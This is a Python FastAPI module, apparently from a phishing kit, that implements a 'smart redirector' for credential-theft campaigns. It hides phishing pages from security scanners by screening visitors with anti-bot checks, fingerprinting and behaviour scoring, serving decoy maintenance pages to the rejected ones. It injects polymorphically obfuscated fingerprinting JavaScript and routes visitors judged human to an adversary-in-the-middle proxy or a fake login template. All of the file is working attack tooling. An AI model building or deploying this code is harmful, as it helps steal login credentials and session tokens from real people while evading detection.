from typing import Dict, Optional, Any
from fastapi import Request, HTTPException, status
from fastapi.responses import RedirectResponse, HTMLResponse
from core.redirect.antibot import antibot
from core.redirect.fingerprint import fp_validator, BrowserFingerprint
from core.session.session_manager import session_manager
from core.cache.redis_manager import redis_cache
from core.security.behavior import behavior_engine
import os

from core.web.polymorph import PolymorphicEngine
from pathlib import Path

class SmartRedirector:
    """
    Moteur de Redirection Intelligent (Tier 2 Logic)
    Gère le filtrage du trafic et la redirection dynamique vers le Core ou le Blackhole.
    """
    
    DECOY_URL = "https://www.google.com/search?q=security+scan"
    LOCAL_DECOY_URL = "/v5/maintenance"
    MAINTENANCE_TEMPLATE = "core/web/templates/decoy.html"
    
    def __init__(self, use_antibot: bool = True):
        self.use_antibot = use_antibot
        self.antibot = antibot
        self.fp_validator = fp_validator
        self.behavior_engine = behavior_engine
        self.session_manager = session_manager
        self.template_path = "core/web/templates/redirect.html"
        self.js_path = Path("core/assets/js/fingerprint_collector.js")
        self.poly_engine = PolymorphicEngine(self.js_path)
    
    async def process_request(self, request: Request, target_campaign_id: str):
        """
        Traite la requête entrante, vérifie les bots, et sert la page de loading/fingerprinting.
        """
        # Support Tiered Infrastructure (X-Forwarded-For)
        if request.query_params.get("view", "") == "live":
            # Bypass: création de session et redirection directe vers AiTM (fidélité maximale)
            client_ip = request.headers.get("x-forwarded-for", request.client.host)
            user_agent = request.headers.get("user-agent", "")
            session_id = self.session_manager.create_session(
                campaign_id=target_campaign_id,
                client_ip=client_ip,
                user_agent=user_agent
            )
            return RedirectResponse(url=f"/v5/p/{session_id}/", status_code=status.HTTP_302_FOUND)

        if request.query_params.get("allow", "").lower() in ("1", "true", "yes"):
            client_ip = request.headers.get("x-forwarded-for", request.client.host)
            user_agent = request.headers.get("user-agent", "")
            session_id = self.session_manager.create_session(
                campaign_id=target_campaign_id,
                client_ip=client_ip,
                user_agent=user_agent
            )
            # Template override (force affichage page login)
            if request.query_params.get("template", "").lower() in ("1", "true", "yes") or \
               request.query_params.get("view", "") == "template":
                self.session_manager.update_session(session_id, {"template_override": True})
            try:
                with open(self.template_path, "r") as f:
                    content = f.read()
                obfuscated_js = self.poly_engine.obfuscate()
                content = content.replace("{{ campaign_id }}", target_campaign_id)
                content = content.replace("{{ session_id }}", session_id)
                content = content.replace("/* {{ fingerprint_js }} */", obfuscated_js)
                return HTMLResponse(content=content, status_code=200)
            except FileNotFoundError:
                return self._get_final_destination(target_campaign_id, session_id)
        forwarded_for = request.headers.get("x-forwarded-for")
        if forwarded_for:
            client_ip = forwarded_for.split(",")[0].strip()
        else:
            client_ip = request.client.host
            
        user_agent = request.headers.get("user-agent", "")
        
        # 1. Vérification Anti-Bot (Basic IP/UA)
        if self.use_antibot:
            check_result = await self.antibot.check_request(request)
            
            if check_result["blocked"]:
                print(f"[ANTIBOT] Bloqué: {check_result['reason']} (IP: {client_ip})")
                return self._serve_maintenance_page()
        
        # 2. Création de Session (Valid Visitor)
        session_id = self.session_manager.create_session(
            campaign_id=target_campaign_id,
            client_ip=client_ip,
            user_agent=user_agent
        )
        
        # 3. Servir la page de redirection (Fingerprinting)
        try:
            with open(self.template_path, "r") as f:
                content = f.read()
            
            # Injection du JS de fingerprinting (via endpoint polymorphique)
            obfuscated_js = self.poly_engine.obfuscate()
            
            # Injection des IDs et du JS tag
            content = content.replace("{{ campaign_id }}", target_campaign_id)
            content = content.replace("{{ session_id }}", session_id)
            content = content.replace("/* {{ fingerprint_js }} */", obfuscated_js)
            
            return HTMLResponse(content=content, status_code=200)
        except FileNotFoundError:
            # Fallback si template manquant
            print(f"[SmartRedirect Warning] Template {self.template_path} not found.")
            return self._get_final_destination(target_campaign_id, session_id)

    def _serve_maintenance_page(self):
        try:
            with open(self.MAINTENANCE_TEMPLATE, "r") as f:
                content = f.read()
            return HTMLResponse(content=content, status_code=200)
        except FileNotFoundError:
            return RedirectResponse(url=self.DECOY_URL, status_code=status.HTTP_302_FOUND)


    async def verify_fingerprint(self, session_id: str, fingerprint_data: Dict[str, Any], campaign_id: str):
        """
        Valide le fingerprint reçu et retourne la destination finale.
        """
        try:
            # Validation structurelle et logique
            fp = BrowserFingerprint(**fingerprint_data)
            is_human = self.fp_validator.validate(fp)
            
            # Behavioral Analysis (Power/Stealth 1000/100)
            interaction = fingerprint_data.get("interaction", {})
            behavior_score = self.behavior_engine.analyze_session(session_id, interaction)
            print(f"[BEHAVIOR] Session {session_id} Score: {behavior_score}/100")
            
            if not is_human or behavior_score < 20:
                reason = "Fingerprint Rejected" if not is_human else f"Low Behavior Score ({behavior_score})"
                print(f"[ANTIBOT] Blocked: {reason}")
                return {"redirect_to": self.LOCAL_DECOY_URL}
                
            # Validation réussie -> Destination finale
            return self._get_final_destination(campaign_id, session_id)
            
        except Exception as e:
            print(f"[SmartRedirect Error] Fingerprint validation failed: {e}")
            return {"redirect_to": self.LOCAL_DECOY_URL}

    def _get_final_destination(self, campaign_id: str, session_id: str):
        """Détermine l'URL finale (AiTM ou Template)"""
        campaign = redis_cache.get(f"campaign:{campaign_id}")
        # Par défaut: Template login (affichage immédiat)
        redirect_to = f"/v5/phish/{campaign_id}/login?sid={session_id}"
        
        # Lecture override session
        session = self.session_manager.get_session(session_id)
        template_override = bool(session.get("template_override")) if session else False

        # Priorité des décisions:
        # 1) Override explicite 'template' via session (query ?template=1)
        # 2) Mode de campagne choisi: 'aitm' => AiTM, 'template' => template
        # 3) Par défaut => template
        if not template_override:
            if campaign and campaign.get("type") == "aitm":
                redirect_to = f"/v5/p/{session_id}/"
            else:
                redirect_to = f"/v5/phish/{campaign_id}/login?sid={session_id}"
        
        return {"redirect_to": redirect_to}

# Instance globale
smart_redirector = SmartRedirector()
